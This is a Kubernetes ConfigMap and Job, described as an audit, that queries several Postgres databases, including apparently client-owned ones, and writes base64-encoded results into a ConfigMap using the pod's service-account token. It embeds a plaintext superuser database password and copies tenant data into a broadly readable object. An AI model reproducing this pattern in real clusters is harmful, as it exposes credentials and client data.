apiVersion: v1
kind: ConfigMap
metadata:
  name: rock-audit-result2
  namespace: default
data:
  status: "pending"
---
apiVersion: batch/v1
kind: Job
metadata:
  name: rock-audit-v2
  namespace: default
spec:
  ttlSecondsAfterFinished: 86400
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: alpine:latest
        command:
        - /bin/sh
        - -c
        - |
          apk add -q postgresql-client curl jq 2>/dev/null
          PG="PGPASSWORD=wpEJl3WKOImARD9WgBsa psql -h 172.16.10.14 -p 6432 -U postgres"
          # Files with correct cols
          FILES=$(eval "$PG -d rockefeller_db -c 'SELECT filepath, version, uploadedby, uploadeddate, size FROM filesrepository ORDER BY uploadeddate DESC LIMIT 30;'" 2>&1)
          # Rawstorage with correct cols
          RAW=$(eval "$PG -d rockefeller_db -c 'SELECT id, displayname, path, created_by, created_at FROM rawstorage ORDER BY created_at DESC LIMIT 20;'" 2>&1)
          # Workflowrepository with correct cols
          WF=$(eval "$PG -d rockefeller_db -c 'SELECT name, displayname, state, submittedby, submittedtime, resultstatus FROM workflowrepository ORDER BY submittedtime DESC LIMIT 20;'" 2>&1)
          # List datacore schema tables
          DATACORE=$(eval "$PG -d rockefeller_db -c 'SELECT schemaname, tablename FROM pg_tables WHERE schemaname='"'"'datacore'"'"' ORDER BY tablename;'" 2>&1)
          # Check a client db schema: slb_db
          SLBTABLES=$(eval "$PG -d slb_db -c '\dt'" 2>&1)
          # Check conoco_db schema
          CONOCOTABLES=$(eval "$PG -d conoco_db -c '\dt'" 2>&1)
          # n8n_workflow_project_link
          N8NLINK=$(eval "$PG -d rockefeller_db -c 'SELECT * FROM n8n_workflow_project_link;'" 2>&1)
          # changelog
          CHANGELOG=$(eval "$PG -d rockefeller_db -c 'SELECT * FROM changelog ORDER BY id DESC LIMIT 10;'" 2>&1)
          # releases
          RELEASES=$(eval "$PG -d rockefeller_db -c 'SELECT * FROM releases ORDER BY id DESC LIMIT 10;'" 2>&1)
          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          API=https://kubernetes.default.svc
          CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
          RESULT=$(printf '{"files":"%s","raw":"%s","wf":"%s","datacore":"%s","slb":"%s","conoco":"%s","n8nlink":"%s","changelog":"%s","releases":"%s"}' \
            "$(echo "$FILES" | base64 | tr -d '\n')" \
            "$(echo "$RAW" | base64 | tr -d '\n')" \
            "$(echo "$WF" | base64 | tr -d '\n')" \
            "$(echo "$DATACORE" | base64 | tr -d '\n')" \
            "$(echo "$SLBTABLES" | base64 | tr -d '\n')" \
            "$(echo "$CONOCOTABLES" | base64 | tr -d '\n')" \
            "$(echo "$N8NLINK" | base64 | tr -d '\n')" \
            "$(echo "$CHANGELOG" | base64 | tr -d '\n')" \
            "$(echo "$RELEASES" | base64 | tr -d '\n')")
          curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
            -X PATCH -H "Content-Type: application/merge-patch+json" \
            "$API/api/v1/namespaces/default/configmaps/rock-audit-result2" \
            -d "{\"data\":{\"status\":\"done\",\"result\":$(echo $RESULT | jq -c -R '.')}}"
          echo "Done"